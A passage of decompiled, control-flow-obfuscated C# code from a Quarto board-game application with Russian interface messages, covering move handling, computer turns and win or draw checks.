					num3 = ((int)num4 * -1201961981) ^ -1898790621;
					continue;
				case 14u:
				{
					int num9;
					if (num5 >= 4)
					{
						num3 = 1472298743;
						num9 = 1472298743;
					}
					else
					{
						num3 = 1783562465;
						num9 = 1783562465;
					}
					continue;
				}
				case 13u:
					num5++;
					num3 = ((int)num4 * -71606831) ^ -364200516;
					continue;
				case 12u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num3 = ((int)num4 * -1615908698) ^ 0x32F5A2B2;
					continue;
				case 11u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num3 = ((int)num4 * -855357384) ^ 0xACBD4BB;
						continue;
					}
					num7 = 0;
					goto IL_01a0;
				case 9u:
					num6++;
					num3 = 1041949248;
					continue;
				case 8u:
					num3 = ((int)num4 * -2077580760) ^ -1432227437;
					continue;
				case 7u:
					num7 = ((board[num2, num] == null) ? 1 : 0);
					goto IL_01a0;
				case 6u:
					num6 = 0;
					num3 = 1041949248;
					continue;
				case 5u:
					num5 = 0;
					num3 = ((int)num4 * -732585233) ^ -1291915409;
					continue;
				case 4u:
					num3 = (int)((num4 * 2093003891) ^ 0x3BDEE1BC);
					continue;
				case 3u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num3 = (int)(num4 * 662968088) ^ -782914687;
					continue;
				case 2u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num + 0.05f) * (float)size, ((float)num2 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num * size + 4, num2 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num3 = ((int)num4 * -327360661) ^ -268020044;
					continue;
				case 1u:
					Form1.smethod_45(graphics_);
					num3 = ((int)num4 * -1100766198) ^ -2090879928;
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num3 = ((int)num4 * -542094013) ^ 0x7101891C;
					continue;
				default:
					return;
				case 16u:
					break;
				case 10u:
					return;
					IL_01a0:
					flag2 = (byte)num7 != 0;
					num3 = 745887411;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0c02: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c30: Expected O, but got Unknown
		int num18 = default(int);
		bool flag5 = default(bool);
		bool flag6 = default(bool);
		bool flag15 = default(bool);
		int num7 = default(int);
		int num8 = default(int);
		int num34 = default(int);
		int num11 = default(int);
		int num12 = default(int);
		int num10 = default(int);
		int num9 = default(int);
		int num16 = default(int);
		bool flag2 = default(bool);
		int num13 = default(int);
		bool flag17 = default(bool);
		int num3 = default(int);
		int num27 = default(int);
		int num35 = default(int);
		int num31 = default(int);
		int num37 = default(int);
		bool flag14 = default(bool);
		bool flag7 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		int num15 = default(int);
		int num23 = default(int);
		int num24 = default(int);
		bool flag9 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		bool flag4 = default(bool);
		int num4 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag19 = default(bool);
		int num14 = default(int);
		int num17 = default(int);
		bool flag13 = default(bool);
		bool flag18 = default(bool);
		bool flag3 = default(bool);
		bool flag10 = default(bool);
		bool flag12 = default(bool);
		bool flag16 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		bool flag8 = default(bool);
		bool flag11 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -2057007147;
			while (true)
			{
				uint num2;
				int num22;
				int num46;
				int num53;
				int num30;
				switch ((num2 = (uint)num ^ 0xE40580EBu) % 183u)
				{
				case 182u:
					num18 = 0;
					num = ((int)num2 * -1120967209) ^ -953354010;
					continue;
				case 181u:
				{
					int num28;
					int num29;
					if (!flag5)
					{
						num28 = 594320554;
						num29 = 594320554;
					}
					else
					{
						num28 = 1311513314;
						num29 = 1311513314;
					}
					num = num28 ^ ((int)num2 * -1826525842);
					continue;
				}
				case 180u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 1754141555) ^ -926493938;
					continue;
				case 179u:
				{
					int num49;
					int num50;
					if (flag6)
					{
						num49 = 1257030955;
						num50 = 1257030955;
					}
					else
					{
						num49 = 1636180938;
						num50 = 1636180938;
					}
					num = num49 ^ (int)(num2 * 1210560006);
					continue;
				}
				case 178u:
				{
					int num69;
					int num70;
					if (flag15)
					{
						num69 = 675644454;
						num70 = 675644454;
					}
					else
					{
						num69 = 404004273;
						num70 = 404004273;
					}
					num = num69 ^ ((int)num2 * -1102273284);
					continue;
				}
				case 177u:
					Form1.smethod_5((Control)(object)borderBox[num7, num8], Color.White);
					num = (int)((num2 * 826542986) ^ 0x1A148BDD);
					continue;
				case 176u:
					num = (int)((num2 * 1532098753) ^ 0x4811B7F3);
					continue;
				case 175u:
					num34 = 0;
					num = ((int)num2 * -1768868750) ^ -1192730666;
					continue;
				case 174u:
					num = (int)((num2 * 1617212426) ^ 0x9CAA93);
					continue;
				case 173u:
					num = (int)(num2 * 1190910750) ^ -1225691431;
					continue;
				case 172u:
					if (storage[num11, num12] != null)
					{
						num = ((int)num2 * -549935386) ^ 0x2A697B7E;
						continue;
					}
					num22 = 1;
					goto IL_0156;
				case 171u:
					num10 = Form1.smethod_33(rnd, 4);
					num9 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1518698219) ^ -592753908;
					continue;
				case 170u:
					num16++;
					num = ((int)num2 * -285752015) ^ 0x434857D9;
					continue;
				case 169u:
				{
					int num65;
					int num66;
					if (flag2)
					{
						num65 = 466477377;
						num66 = 466477377;
					}
					else
					{
						num65 = 31170285;
						num66 = 31170285;
					}
					num = num65 ^ ((int)num2 * -21764899);
					continue;
				}
				case 168u:
					num = -1807207276;
					continue;
				case 167u:
					num13 = 0;
					num = ((int)num2 * -1200358283) ^ -125543617;
					continue;
				case 166u:
					flag17 = num3 < 4;
					num = -60603453;
					continue;
				case 165u:
					num7 = num27;
					num = (int)(num2 * 477437801) ^ -504871023;
					continue;
				case 164u:
					if (!Stop(board))
					{
						num = (int)(num2 * 275677034) ^ -442272897;
						continue;
					}
					goto IL_024b;
				case 163u:
				{
					int num56;
					int num57;
					if (!flag17)
					{
						num56 = -62267199;
						num57 = -62267199;
					}
					else
					{
						num56 = -1524335076;
						num57 = -1524335076;
					}
					num = num56 ^ (int)(num2 * 986189745);
					continue;
				}
				case 162u:
					Form1.smethod_15(timer1);
					num = -1559991005;
					continue;
				case 161u:
					Form1.smethod_7((Control)(object)pictureBox[num35, num31], bool_0: true);
					num31++;
					num = -1779661887;
					continue;
				case 160u:
					num = ((int)num2 * -75758863) ^ 0xF2AD18;
					continue;
				case 159u:
					num = (int)(num2 * 1965237192) ^ -1266035204;
					continue;
				case 158u:
					num = (int)((num2 * 323603556) ^ 0x131E4E43);
					continue;
				case 157u:
					num8 = 0;
					num = (int)(num2 * 1278243870) ^ -953876636;
					continue;
				case 156u:
					board[num3, num37] = new Figurine(storage[num7, num8]);
					num = ((int)num2 * -535734510) ^ -668203972;
					continue;
				case 155u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 787283615) ^ -1048897237;
					continue;
				case 154u:
				{
					int num44;
					int num45;
					if (flag14)
					{
						num44 = -1253067970;
						num45 = -1253067970;
					}
					else
					{
						num44 = -460759389;
						num45 = -460759389;
					}
					num = num44 ^ (int)(num2 * 884567773);
					continue;
				}
				case 153u:
					num = ((int)num2 * -1022186911) ^ -1181201113;
					continue;
				case 152u:
					flag7 = num16 < 4;
					num = -722696993;
					continue;
				case 151u:
					array3[num10, num9] = new Figurine(storage[num7, num8]);
					num = ((int)num2 * -1497261828) ^ 0x2F9FA08E;
					continue;
				case 150u:
					num = (int)(num2 * 1152477020) ^ -1375040663;
					continue;
				case 149u:
					num11 = Form1.smethod_33(rnd, 4);
					num12 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1975424611) ^ -417717110;
					continue;
				case 148u:
					num15++;
					num = -1978041339;
					continue;
				case 147u:
					num23 = 0;
					num24 = 0;
					num = ((int)num2 * -939817800) ^ -173195170;
					continue;
				case 146u:
					Paint_Board();
					num = ((int)num2 * -1442852454) ^ -289958337;
					continue;
				case 145u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 626366099) ^ 0x24A7D1BA);
					continue;
				case 144u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 551582875) ^ 0x48E33F71);
					continue;
				case 143u:
					flag9 = Stop(array);
					num = (int)((num2 * 1750088883) ^ 0x4509A32);
					continue;
				case 142u:
					num = ((int)num2 * -1697623872) ^ -1278547368;
					continue;
				case 141u:
					num34++;
					num = (int)((num2 * 1163213914) ^ 0x54E8D7F7);
					continue;
				case 140u:
					num = (int)(num2 * 680918783) ^ -504368698;
					continue;
				case 139u:
					num = ((int)num2 * -1145203159) ^ 0x26A9C146;
					continue;
				case 138u:
					num = (int)(num2 * 1453467810) ^ -677841717;
					continue;
				case 136u:
					flag4 = Form1.smethod_41((Control)(object)borderBox[num27, num16]) == Color.Red;
					num = (int)(num2 * 363783276) ^ -880445142;
					continue;
				case 135u:
				{
					int num21;
					if (!Standoff(board))
					{
						num = -1883035772;
						num21 = -1883035772;
					}
					else
					{
						num = -1092397280;
						num21 = -1092397280;
					}
					continue;
				}
				case 134u:
					num4 = 0;
					num = -1131547720;
					continue;
				case 133u:
					num = ((int)num2 * -327304289) ^ -134577192;
					continue;
				case 132u:
					num = -1897350727;
					continue;
				case 131u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num7, num8]), num9 * size + 4, num10 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 1702951586) ^ 0x436CC5B5);
					continue;
				case 130u:
					num46 = ((num34 < 9) ? 1 : 0);
					goto IL_060f;
				case 129u:
					num = ((int)num2 * -225090607) ^ 0x779CA6F4;
					continue;
				case 128u:
					num = -71328896;
					continue;
				case 127u:
					num = (int)(num2 * 1199337577) ^ -423455155;
					continue;
				case 126u:
					num15 = 0;
					num = -1747786663;
					continue;
				case 125u:
					num35++;
					num = (int)((num2 * 1630675891) ^ 0x7BD509FB);
					continue;
				case 124u:
					num = (int)((num2 * 1315143013) ^ 0x78C6E3D6);
					continue;
				case 123u:
					num = ((int)num2 * -2077248452) ^ 0x24960355;
					continue;
				case 122u:
				{
					int num67;
					int num68;
					if (flag19)
					{
						num67 = -1698638986;
						num68 = -1698638986;
					}
					else
					{
						num67 = -246793940;
						num68 = -246793940;
					}
					num = num67 ^ (int)(num2 * 1429494001);
					continue;
				}
				case 121u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -1039297252) ^ 0x3397F4D;
					continue;
				case 120u:
				{
					storage[num7, num8] = null;
					int num63;
					int num64;
					if (!Standoff(board))
					{
						num63 = 1509690474;
						num64 = 1509690474;
					}
					else
					{
						num63 = 1157596995;
						num64 = 1157596995;
					}
					num = num63 ^ (int)(num2 * 2047633202);
					continue;
				}
				case 119u:
					num22 = ((num12 == num8) ? 1 : 0);
					goto IL_0156;
				case 118u:
				{
					int num62;
					if (num14 < 4)
					{
						num = -1526009868;
						num62 = -1526009868;
					}
					else
					{
						num = -491104559;
						num62 = -491104559;
					}
					continue;
				}
				case 117u:
					num = -703136747;
					continue;
				case 116u:
					num17 = 0;
					num = (int)((num2 * 2022115778) ^ 0x666B6306);
					continue;
				case 115u:
					num = ((int)num2 * -1307504851) ^ 0x4EB61DB4;
					continue;
				case 114u:
					flag13 = num13 < 4;
					num = -2008758500;
					continue;
				case 113u:
					flag18 = board[num10, num9] != null;
					num = ((int)num2 * -1400342131) ^ 0x398E7C38;
					continue;
				case 112u:
					num = ((int)num2 * -1158868921) ^ -2022182562;
					continue;
				case 111u:
					step++;
					num = (int)((num2 * 251978690) ^ 0x64C681D6);
					continue;
				case 110u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -1092514100) ^ 0x52DAAB72;
					continue;
				case 109u:
					Form1.smethod_20(pictureBox[num7, num8], (Image)null);
					num = (int)(num2 * 512820951) ^ -1911586103;
					continue;
				case 108u:
					Form1.smethod_30((Control)(object)label2);
					num = ((int)num2 * -762058631) ^ 0x6D178A97;
					continue;
				case 107u:
					Form1.smethod_30((Control)(object)pictureBox[num7, num8]);
					num = ((int)num2 * -1441832492) ^ 0x50CA0E7F;
					continue;
				case 106u:
					num = ((int)num2 * -1992690554) ^ 0x3790036D;
					continue;
				case 105u:
					flag3 = Form1.smethod_41((Control)(object)borderBox[num13, num4]) == Color.Blue;
					num = (int)((num2 * 1066010524) ^ 0x48112378);
					continue;
				case 104u:
					Form1.smethod_47(1000);
					num = (int)(num2 * 607875993) ^ -1593043074;
					continue;
				case 103u:
					num = -241856388;
					continue;
				case 102u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = ((int)num2 * -321355377) ^ 0x2B465DAB;
					continue;
				case 101u:
					num37++;
					num = -2073277444;
					continue;
				case 100u:
					flag19 = num15 < 4;
					num = -1010850666;
					continue;
				case 99u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -1624791180) ^ 0x44DBDA4A;
					continue;
				case 98u:
				{
					int num60;
					int num61;
					if (flag9)
					{
						num60 = -432590758;
						num61 = -432590758;
					}
					else
					{
						num60 = -582490200;
						num61 = -582490200;
					}
					num = num60 ^ ((int)num2 * -2120333694);
					continue;
				}
				case 97u:
					Form1.smethod_30((Control)(object)borderBox[num7, num8]);
					num = ((int)num2 * -157048511) ^ -1319074409;
					continue;
				case 96u:
					Form1.smethod_5((Control)(object)borderBox[num7, num8], Color.White);
					num = ((int)num2 * -1316698016) ^ 0x298A8C2D;
					continue;
				case 95u:
					num31 = 0;
					num = -1024994388;
					continue;
				case 94u:
					num = ((int)num2 * -1412571748) ^ -138671844;
					continue;
				case 93u:
					num = -562641944;
					continue;
				case 92u:
					num27 = 0;
					num = ((int)num2 * -1469402774) ^ -445607927;
					continue;
				case 91u:
					num35 = 0;
					num = (int)((num2 * 990649335) ^ 0x45D69EBD);
					continue;
				case 90u:
					num = (int)((num2 * 2093301937) ^ 0x5447E2E0);
					continue;
				case 89u:
					num = -1875207546;
					continue;
				case 88u:
					if (num11 == num7)
					{
						num = ((int)num2 * -428807608) ^ 0x3230A2A5;
						continue;
					}
					num22 = 0;
					goto IL_0156;
				case 87u:
				{
					int num58;
					int num59;
					if (flag18)
					{
						num58 = -1894681379;
						num59 = -1894681379;
					}
					else
					{
						num58 = -1136321664;
						num59 = -1136321664;
					}
					num = num58 ^ ((int)num2 * -355294459);
					continue;
				}
				case 86u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1673520266) ^ -54027911;
					continue;
				case 85u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -1787731594;
					continue;
				case 84u:
					num = -2116663675;
					continue;
				case 82u:
					Form1.smethod_30((Control)(object)borderBox[num13, num4]);
					num = ((int)num2 * -2019510963) ^ 0x508A6992;
					continue;
				case 81u:
					num = (int)(num2 * 1604405611) ^ -1911944650;
					continue;
				case 80u:
					num14 = 0;
					num = (int)((num2 * 766716395) ^ 0x60C30E4B);
					continue;
				case 79u:
					num14++;
					num = ((int)num2 * -145659368) ^ 0x2351FB6;
					continue;
				case 78u:
					num8 = num16;
					num = (int)(num2 * 115958157) ^ -1079436008;
					continue;
				case 77u:
					num = (int)((num2 * 1854562640) ^ 0xAA8592C);
					continue;
				case 76u:
					num = (int)((num2 * 455154606) ^ 0x74B59555);
					continue;
				case 75u:
					flag10 = board[num3, num37] == null;
					num = -443944413;
					continue;
				case 74u:
					num23 = num13;
					num24 = num4;
					Form1.smethod_5((Control)(object)borderBox[num13, num4], Color.White);
					num = (int)(num2 * 357534831) ^ -405913058;
					continue;
				case 73u:
					num = ((int)num2 * -474995908) ^ -1395191290;
					continue;
				case 72u:
					flag14 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num4 * size + size / 2, (int)(((float)num13 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = -1859192125;
					continue;
				case 71u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num9 + 0.05f) * (float)size, ((float)num10 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -874503408) ^ -74067982;
					continue;
				case 70u:
					num37 = 0;
					num = -851635291;
					continue;
				case 69u:
				{
					int num54;
					int num55;
					if (flag12)
					{
						num54 = 1960176810;
						num55 = 1960176810;
					}
					else
					{
						num54 = 1513851723;
						num55 = 1513851723;
					}
					num = num54 ^ ((int)num2 * -2002883197);
					continue;
				}
				case 68u:
					num = ((int)num2 * -2079322091) ^ -841389564;
					continue;
				case 67u:
					if (!Standoff(board))
					{
						num = -442144198;
						num53 = -442144198;
						continue;
					}
					goto IL_024b;
				case 66u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					Form1.smethod_15(timer1);
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -678546412) ^ -1770627495;
					continue;
				case 65u:
					Form1.smethod_30((Control)(object)pictureBox[num7, num8]);
					num = ((int)num2 * -1371954261) ^ 0x517F7396;
					continue;
				case 64u:
				{
					int num51;
					int num52;
					if (!flag16)
					{
						num51 = 1058828913;
						num52 = 1058828913;
					}
					else
					{
						num51 = 1978313564;
						num52 = 1978313564;
					}
					num = num51 ^ ((int)num2 * -23761890);
					continue;
				}
				case 63u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 1466868345) ^ -1601723035;
					continue;
				case 62u:
				{
					int num47;
					int num48;
					if (flag4)
					{
						num47 = 1350079751;
						num48 = 1350079751;
					}
					else
					{
						num47 = 1378597870;
						num48 = 1378597870;
					}
					num = num47 ^ (int)(num2 * 968277331);
					continue;
				}
				case 61u:
					num27++;
					num = (int)(num2 * 721314552) ^ -1519368730;
					continue;
				case 60u:
					flag8 = false;
					num = (int)(num2 * 1257666859) ^ -1795696003;
					continue;
				case 59u:
					Form1.smethod_7((Control)(object)pictureBox[num27, num16], bool_0: false);
					num = ((int)num2 * -1180943884) ^ 0x2F26EBBF;
					continue;
				case 58u:
					num = ((int)num2 * -290605139) ^ 0x3F781E64;
					continue;
				case 57u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num7 = 0;
					num = ((int)num2 * -1037610622) ^ -2017108326;
					continue;
				case 56u:
					if (!flag8)
					{
						num = ((int)num2 * -409742754) ^ 0x10C3E81C;
						continue;
					}
					num46 = 1;
					goto IL_060f;
				case 55u:
					num = (int)((num2 * 1294989841) ^ 0x60F5CB59);
					continue;
				case 54u:
					Form1.smethod_5((Control)(object)borderBox[num27, num16], Color.LimeGreen);
					Form1.smethod_30((Control)(object)borderBox[num27, num16]);
					num = ((int)num2 * -606162849) ^ -413747732;
					continue;
				case 53u:
				{
					int num42;
					int num43;
					if (flag13)
					{
						num42 = 942749637;
						num43 = 942749637;
					}
					else
					{
						num42 = 87300111;
						num43 = 87300111;
					}
					num = num42 ^ (int)(num2 * 1058361922);
					continue;
				}
				case 52u:
					Form1.smethod_30((Control)(object)pictureBox1);
					Form1.smethod_47(200);
					num = ((int)num2 * -470295533) ^ 0x41E18BE5;
					continue;
				case 51u:
					Form1.smethod_20(pictureBox[num13, num4], (Image)null);
					num = (int)((num2 * 2064700810) ^ 0x46A30B9D);
					continue;
				case 50u:
					Form1.smethod_30((Control)(object)pictureBox[num13, num4]);
					num = ((int)num2 * -273366548) ^ -160541730;
					continue;
				case 49u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num37 + 0.05f) * (float)size, ((float)num3 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 1925760375) ^ -85078022;
					continue;
				case 48u:
					num = -1324332446;
					continue;
				case 47u:
					num = -558671589;
					continue;
				case 46u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -419650364) ^ -1307675772;
					continue;
				case 45u:
					flag12 = array3[num14, num15] == null;
					num = -1920703992;
					continue;
				case 44u:
					num = (int)((num2 * 1190736780) ^ 0x31A3B89E);
					continue;
				case 43u:
					num = ((int)num2 * -1536210109) ^ -100044219;
					continue;
				case 42u:
					array2[num3, num37] = new Figurine(storage[num7, num8]);
					if (!Stop(array2))
					{
						num = (int)(num2 * 642674504) ^ -535773734;
						continue;
					}
					num30 = 1;
					goto IL_10a0;
				case 41u:
					num = (int)(num2 * 503723929) ^ -1827485293;
					continue;
				case 40u:
					flag11 = num37 < 4;
					num = -1243703614;
					continue;
				case 39u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num3 = 0;
					num = ((int)num2 * -1647685738) ^ 0x384BB28D;
					continue;
				case 38u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -1567369875) ^ -656335183;
					continue;
				case 37u:
					flag = num27 < 4;
					num = -2068403699;
					continue;
				case 36u:
					array = (Figurine[,])Form1.smethod_48((Array)array3);
					num = ((int)num2 * -1309426433) ^ 0x4CD71C21;
					continue;
				case 35u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -693173826) ^ -927213960;
					continue;
				case 34u:
					Form1.smethod_20(pictureBox[num7, num8], (Image)null);
					num = ((int)num2 * -281195265) ^ -364384076;
					continue;
				case 33u:
				{
					int num40;
					int num41;
					if (!flag11)
					{
						num40 = -1231269766;
						num41 = -1231269766;
					}
					else
					{
						num40 = -1259608808;
						num41 = -1259608808;
					}
					num = num40 ^ (int)(num2 * 359173102);
					continue;
				}
				case 32u:
				{
					int num38;
					int num39;
					if (flag10)
					{
						num38 = -1641767081;
						num39 = -1641767081;
					}
					else
					{
						num38 = -1037260466;
						num39 = -1037260466;
					}
					num = num38 ^ ((int)num2 * -172018399);
					continue;
				}
				case 31u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num7, num8]), num37 * size + 4, num3 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -802521764) ^ -1738161154;
					continue;
				case 30u:
				{
					int num36;
					if (num35 >= 4)
					{
						num = -1377112873;
						num36 = -1377112873;
					}
					else
					{
						num = -53405096;
						num36 = -53405096;
					}
					continue;
				}
				case 29u:
					num = -1913550765;
					continue;
				case 28u:
					num = ((int)num2 * -1139848844) ^ -1197901587;
					continue;
				case 27u:
					flag8 = true;
					num = ((int)num2 * -869719335) ^ -1540130239;
					continue;
				case 26u:
					num = (int)(num2 * 773040065) ^ -1987287483;
					continue;
				case 25u:
				{
					int num32;
					int num33;
					if (flag7)
					{
						num32 = 850854068;
						num33 = 850854068;
					}
					else
					{
						num32 = 1973475469;
						num33 = 1973475469;
					}
					num = num32 ^ (int)(num2 * 290005755);
					continue;
				}
				case 24u:
					num = (int)(num2 * 665805491) ^ -1453550049;
					continue;
				case 23u:
					num = (int)(num2 * 1242979968) ^ -475501490;
					continue;
				case 22u:
					flag6 = num31 < 4;
					num = -1098344140;
					continue;
				case 21u:
					num = (int)(num2 * 1367810249) ^ -3320013;
					continue;
				case 20u:
					num30 = (Standoff(array2) ? 1 : 0);
					goto IL_10a0;
				case 19u:
				{
					int num25;
					int num26;
					if (!Form1.smethod_46((Control)(object)pictureBox1))
					{
						num25 = -1289042057;
						num26 = -1289042057;
					}
					else
					{
						num25 = -2052333080;
						num26 = -2052333080;
					}
					num = num25 ^ (int)(num2 * 1279314244);
					continue;
				}
				case 18u:
					num = (int)(num2 * 1500716112) ^ -1025896212;
					continue;
				case 17u:
					board[num17, num18] = new Figurine(storage[num23, num24]);
					storage[num23, num24] = null;
					num = (int)((num2 * 2101982304) ^ 0x4AB13832);
					continue;
				case 16u:
					num = (int)((num2 * 361892009) ^ 0x41F7E6F4);
					continue;
				case 15u:
					num = (int)(num2 * 243523846) ^ -1597652773;
					continue;
				case 14u:
				{
					int num19;
					int num20;
					if (!flag3)
					{
						num19 = -755072802;
						num20 = -755072802;
					}
					else
					{
						num19 = -672528445;
						num20 = -672528445;
					}
					num = num19 ^ (int)(num2 * 1471710952);
					continue;
				}
				case 13u:
					num17 = num13;
					num18 = num4;
					num = (int)((num2 * 1909370973) ^ 0x7940EF08);
					continue;
				case 12u:
					flag2 = num4 < 4;
					num = -88385556;
					continue;
				case 11u:
					num16 = 0;
					num = -906032982;
					continue;
				case 10u:
					num = -1123587124;
					continue;
				case 9u:
					Form1.smethod_30((Control)(object)borderBox[num11, num12]);
					num = (int)((num2 * 834328320) ^ 0x14050C71);
					continue;
				case 8u:
					array[num14, num15] = new Figurine(storage[num11, num12]);
					num = (int)(num2 * 1949636449) ^ -2078777184;
					continue;
				case 7u:
					num13++;
					num = ((int)num2 * -733365793) ^ -553702866;
					continue;
				case 6u:
					board[num10, num9] = new Figurine(storage[num7, num8]);
					storage[num7, num8] = null;
					Form1.smethod_5((Control)(object)borderBox[num11, num12], Color.Blue);
					num = ((int)num2 * -1586505606) ^ 0x6481D041;
					continue;
				case 5u:
					Form1.smethod_30((Control)(object)borderBox[num7, num8]);
					num = ((int)num2 * -788766204) ^ 0x37F96D6D;
					continue;
				case 4u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = 761285316;
						num6 = 761285316;
					}
					else
					{
						num5 = 1163643531;
						num6 = 1163643531;
					}
					num = num5 ^ (int)(num2 * 1305020253);
					continue;
				}
				case 3u:
					num = (int)(num2 * 880602805) ^ -1171473554;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)((num2 * 1868460189) ^ 0x55546A4);
					continue;
				case 1u:
					num4++;
					num = ((int)num2 * -1795821007) ^ 0x14C07558;
					continue;
				case 0u:
					num3++;
					num = (int)(num2 * 2017368621) ^ -1236891411;
					continue;
				default:
					return;
				case 83u:
					break;
				case 137u:
					return;
					IL_10a0:
					flag5 = (byte)num30 != 0;
					num = -1479220129;
					continue;
					IL_0156:
					flag15 = (byte)num22 != 0;
					num = -2091927129;
					continue;
					IL_024b:
					num = -1117733426;
					num53 = -1117733426;
					continue;
					IL_060f:
					flag16 = (byte)num46 != 0;
					num = -825854414;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num3 = default(int);
		bool flag = default(bool);
		bool result = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1609975571;
			while (true)
			{
				uint num2;
				int num4;
				int num7;
				switch ((num2 = (uint)num ^ 0xE5E70534u) % 75u)
				{
				case 74u:
				{
					int num52;
					if (mem[0, num3].Dark == mem[1, num3].Dark)
					{
						num = -506694689;
						num52 = -506694689;
					}
					else
					{
						num = -1545105946;
						num52 = -1545105946;
					}
					continue;
				}
				case 73u:
					if (mem[2, 1] != null)
					{
						num = (int)((num2 * 770333703) ^ 0x11F4E59A);
						continue;
					}
					goto IL_005b;
				case 72u:
					flag = true;
					num = ((int)num2 * -1088556349) ^ 0x5B5D5017;
					continue;
				case 71u:
				{
					int num57;
					if (mem[0, num3].Point == mem[1, num3].Point)
					{
						num = -1298912768;
						num57 = -1298912768;
					}
					else
					{
						num = -1736269802;
						num57 = -1736269802;
					}
					continue;
				}
				case 70u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = -1143367796;
						continue;
					}
					goto IL_00db;
				case 69u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -2029033913) ^ 0x3A4C55A3;
						continue;
					}
					goto IL_005b;
				case 68u:
					if (mem[3, num3] != null)
					{
						num = (int)((num2 * 1448339822) ^ 0x350B92CD);
						continue;
					}
					goto IL_012d;
				case 67u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = (int)(num2 * 8302201) ^ -66990100;
						continue;
					}
					goto IL_0121;
				case 66u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)(num2 * 117725295) ^ -1627129168;
						continue;
					}
					goto IL_019e;
				case 65u:
					result = flag;
					num = -1115344737;
					continue;
				case 64u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -1032700443) ^ 0x6BB31895;
						continue;
					}
					goto IL_019e;
				case 63u:
				{
					int num36;
					int num37;
					if (mem[2, 2] != null)
					{
						num36 = 1972797588;
						num37 = 1972797588;
					}
					else
					{
						num36 = 148451788;
						num37 = 148451788;
					}
					num = num36 ^ ((int)num2 * -55855213);
					continue;
				}
				case 62u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = ((int)num2 * -333473961) ^ 0x2E506E20;
						continue;
					}
					goto IL_0121;
				case 61u:
				{
					int num17;
					int num18;
					if (mem[1, 1] != null)
					{
						num17 = -948394413;
						num18 = -948394413;
					}
					else
					{
						num17 = -117815581;
						num18 = -117815581;
					}
					num = num17 ^ ((int)num2 * -215666495);
					continue;
				}
				case 60u:
					if (mem[0, 3] != null)
					{
						num = -543918270;
						continue;
					}
					goto IL_005b;
				case 59u:
				{
					int num65;
					int num66;
					if (mem[0, 0].Big != mem[1, 1].Big)
					{
						num65 = -1312155405;
						num66 = -1312155405;
					}
					else
					{
